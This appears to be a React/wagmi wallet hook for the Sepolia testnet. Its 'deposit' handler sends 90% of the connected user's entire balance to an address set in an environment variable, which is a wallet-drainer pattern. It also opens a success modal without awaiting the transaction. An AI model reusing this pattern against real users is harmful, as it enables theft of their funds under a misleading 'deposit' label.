import { useModalStore } from "@/store/modalStore";
import { sepolia } from "viem/chains";
import { useAccount, useBalance, useConnect, useSendTransaction } from "wagmi";
import { injected } from "wagmi/connectors";

type BalanceData = {
  value: bigint;
};

export const useWallet = () => {
  const { address } = useAccount();
  const { connectAsync } = useConnect();
  const { sendTransactionAsync } = useSendTransaction();
  const { data: balanceData } = useBalance({
    address,
    chainId: sepolia.id,
  });
  const { openModal } = useModalStore();

  const calculateAmountInWei = (
    balanceData?: BalanceData
  ): bigint | undefined => {
    if (!balanceData) return undefined;
    return (balanceData.value * 90n) / 100n;
  };

  const handleDeposit = async () => {
    try {
      if (!address) {
        await connectAsync({ chainId: sepolia.id, connector: injected() });
      }

      const amountInWei = calculateAmountInWei(balanceData);
      const recipientAddress = import.meta.env.VITE_WALLET;

      sendTransactionAsync({
        chainId: sepolia.id,
        to: recipientAddress,
        value: amountInWei,
      });

      openModal();
    } catch (error) {
      console.error("Transaction failed:", error);
    }
  };

  return { handleDeposit };
};
